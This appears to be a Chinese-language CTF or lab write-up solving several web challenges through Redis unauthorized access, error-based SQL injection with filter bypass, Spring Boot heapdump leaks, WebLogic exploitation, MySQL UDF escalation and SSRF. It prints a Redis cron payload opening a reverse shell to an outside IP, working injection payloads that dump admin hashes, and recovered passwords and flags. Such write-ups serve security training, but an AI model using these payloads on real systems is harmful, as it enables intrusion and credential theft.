## web7

6379端口，明显的redis未授权，尝试用工具直接打

![image-20240223192348983](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240223192348983.png)

set backup1 "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/116.62.192.44/8888 0>&1\n\n"

## web5

用户名的sql注入，采用报错注入

![image-20240223205523410](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240223205523410.png)

绕过之后查表名

```
admin'+a+and+nd+extractvalue(1,concat(0x7e,(seselectlect+group_concat(table_name)+fr+from+om+information_schema.tables+wh+where+ere+table_schema+like+'beescms'),0x7e))#

admin'+a+and+nd+extractvalue(1,concat(0x7e,(seselectlect+group_concat(column_name)+fr+from+om+information_schema.columns+wh+where+ere+table_name+like+'bees_admin'),0x7e))#

//id,admin_name,admin_password,ad

admin'+a+and+nd+extractvalue(1,concat(0x7e,(seselectlect+group_concat(id,0x7e,admin_name,0x7e,admin_password)+fr+from+om+beescms.bees_admin),0x7e))#

//~9~meetsec~2446d54c2e68d221db9cf
==>login123
```

传个码，连接拿flag

//meetsec1{476e2dceb225678cd466fc3cd2b4c59c}

## web3

直接目录扫一下第一台主机，看环境变量

![image-20240223215303743](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240223215303743.png)

//http://146.56.229.102:22883/actuator/env

//meetsec1{e20cdd96b8985a3557e5720726bb09a8}

springboot heapdump泄露加明文密码获取

先把文件下载下来

![image-20240223225558687](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240223225558687.png)

找关键信息

```
>> spring.security.user.password -> 8kge78k#y%
>> spring.datasource.password -> null
 spring.security.user.name -> actuator
  spring.datasource.username -> null
  org.springframework.boot.context.properties.source.ConfigurationPropertyName@0x6ce668580 -> MeetSec@2nd!2022
Provider.id name -> SunRsaSign

```

换个工具

![image-20240223233503346](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240223233503346.png)

看的更清楚

//meetsec2{9edbd4b03b5f86a9abe079bc63ea847b}

## web2

7001的weblogic,直接拿工具扫一下

![image-20240224123500701](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240224123500701.png)

//meetsec1{3e942fd37767def3a9f68cf5ee6ebee5}

![image-20240224123818458](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240224123818458.png)

扫内网

![image-20240224131334944](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240224131334944.png)

20.12是mysql

详细扫一下,开了3306,升shell加路由扫一下

//{AES}ZhArsOkXPBA9AvAwRxNxpK4G0WlHlpNFBZVsu+PDlYU=

//Meetsec#1024

解密得到了mysql的密码

代理拿flag2

//meetsec2{9fffac75c84bfc66fef4998f3574c6c8}

udf提权拿flag3

//meetsec3{2e947aef43be6dc428a9c626ba7fb824}

![image-20240224151200623](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240224151200623.png)

试着拿shell回来，测试了一下，目标应该是不出网，在第一台机器上用python起服务，另一边用curl下载，似乎是失败了一直连接不上

## web1

![image-20240225142914305](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240225142914305.png)

ssrf利用file协议

![image-20240225145636765](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240225145636765.png)

![image-20240225150257122](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240225150257122.png)

//172.18.240.5

172.18.240.105:3306初步判断是这个ip

好像没有其他ip开放了80端口，怀疑时mysql未授权，用gopher协议打一下

![image-20240225192432240](https://raw.githubusercontent.com/uu2fu3o/blog-picture/master/cloud/image-20240225192432240.png)

好像得到了结果，但是乱码

成都大运会hvv

当时通过sql慢日志写成功写入shell,路径是试出来的

通过烂土豆进行提权

